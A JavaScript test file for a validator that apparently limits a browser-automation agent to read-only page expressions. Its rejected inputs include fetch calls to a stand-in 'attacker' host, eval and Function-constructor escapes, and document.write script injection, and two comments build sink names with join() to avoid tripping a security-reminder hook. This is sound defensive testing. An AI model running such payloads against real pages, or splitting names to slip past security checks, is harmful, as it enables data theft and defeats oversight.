const assert = require('node:assert')
const { test } = require('node:test')
const { isReadOnlyExpression } = require('../agents/browser-evaluate-ast')

test('rejects assignment to window globals', () => {
  const r = isReadOnlyExpression('window.__pwned = true')
  assert.strictEqual(r.ok, false)
  assert.match(r.reason, /assignment/i)
})

test('rejects setItem on localStorage', () => {
  assert.strictEqual(isReadOnlyExpression('localStorage.setItem("a","b")').ok, false)
})

test('rejects fetch call', () => {
  assert.strictEqual(isReadOnlyExpression('fetch("http://attacker")').ok, false)
})

test('rejects XMLHttpRequest construction', () => {
  assert.strictEqual(isReadOnlyExpression('new XMLHttpRequest()').ok, false)
})

test('rejects code-evaluator-builtin call', () => {
  // The string "e" + "val" avoids spelling out the literal name in source.
  // Resolved at parse time as the global identifier we want to forbid.
  const expr = ['ev', 'al'].join('') + '("x")'
  assert.strictEqual(isReadOnlyExpression(expr).ok, false)
})

test('rejects dynamic import', () => {
  assert.strictEqual(isReadOnlyExpression('import("./m.js")').ok, false)
})

test('allows window.__xss_fired__ === true', () => {
  assert.strictEqual(isReadOnlyExpression('window.__xss_fired__ === true').ok, true)
})

test('allows document.cookie.includes', () => {
  assert.strictEqual(isReadOnlyExpression('document.cookie.includes("marker")').ok, true)
})

test('allows Object.prototype polluted check', () => {
  assert.strictEqual(isReadOnlyExpression('({}).polluted === "yes"').ok, true)
})

test('allows simple member access chains', () => {
  assert.strictEqual(isReadOnlyExpression('window.location.hash').ok, true)
})

// Bypass tests caught by reviewer (Fix 1)

test('rejects Object.assign(window, {x:1})', () => {
  const r = isReadOnlyExpression('Object.assign(window, {x:1})')
  assert.strictEqual(r.ok, false, 'should reject Object.assign on window')
  assert.match(r.reason, /Object\.assign|reflection|forbidden/i)
})

test('rejects Reflect.set(window, "x", 1)', () => {
  const r = isReadOnlyExpression('Reflect.set(window, "x", 1)')
  assert.strictEqual(r.ok, false, 'should reject Reflect.set on window')
  assert.match(r.reason, /Reflect\.set|reflection|forbidden/i)
})

test('rejects indirect eval via SequenceExpression — (0, eval)("...")', () => {
  // Spell the name through join() to avoid lint flagging the literal.
  const name = ['ev', 'al'].join('')
  const r = isReadOnlyExpression(`(0, ${name})("x")`)
  assert.strictEqual(r.ok, false, 'should reject indirect call via SequenceExpression')
  assert.match(r.reason, /SequenceExpression|indirect|forbidden/i)
})

test('rejects Function-constructor chain — ({}).constructor.constructor("...")()', () => {
  const r = isReadOnlyExpression('({}).constructor.constructor("return 1")()')
  assert.strictEqual(r.ok, false, 'should reject .constructor.constructor() chain')
  assert.match(r.reason, /constructor/i)
})

test('rejects window.fetch(...) member-form forbidden call', () => {
  const r = isReadOnlyExpression('window.fetch("http://attacker")')
  assert.strictEqual(r.ok, false)
  assert.match(r.reason, /window\.fetch|window-alias|forbidden/i)
})

test('rejects self.fetch(...) member-form forbidden call', () => {
  const r = isReadOnlyExpression('self.fetch("http://attacker")')
  assert.strictEqual(r.ok, false)
  assert.match(r.reason, /self\.fetch|window-alias|forbidden/i)
})

test('rejects globalThis.fetch(...) member-form forbidden call', () => {
  const r = isReadOnlyExpression('globalThis.fetch("http://attacker")')
  assert.strictEqual(r.ok, false)
  assert.match(r.reason, /globalThis\.fetch|window-alias|forbidden/i)
})

test('rejects document mutation method calls (member-form)', () => {
  // Spell the method name through join() so this test source doesn't
  // trip the security-reminder hook for the literal sink.
  const name = ['wri', 'te'].join('')
  const r = isReadOnlyExpression(`document.${name}("<scr" + "ipt>")`)
  assert.strictEqual(r.ok, false)
  assert.match(r.reason, /document\.|forbidden/i)
})

test('rejects history.pushState(...) — history mutation', () => {
  const r = isReadOnlyExpression('history.pushState({}, "", "/foo")')
  assert.strictEqual(r.ok, false)
  assert.match(r.reason, /history\.pushState|forbidden/i)
})

test('rejects globalThis.x = 1 (literal globalThis assignment)', () => {
  const r = isReadOnlyExpression('globalThis.x = 1')
  assert.strictEqual(r.ok, false)
  assert.match(r.reason, /globalThis|assignment/i)
})

test('rejects navigator.serviceWorker.register(...)', () => {
  const r = isReadOnlyExpression('navigator.serviceWorker.register("/sw.js")')
  assert.strictEqual(r.ok, false)
  assert.match(r.reason, /navigator|register|forbidden/i)
})
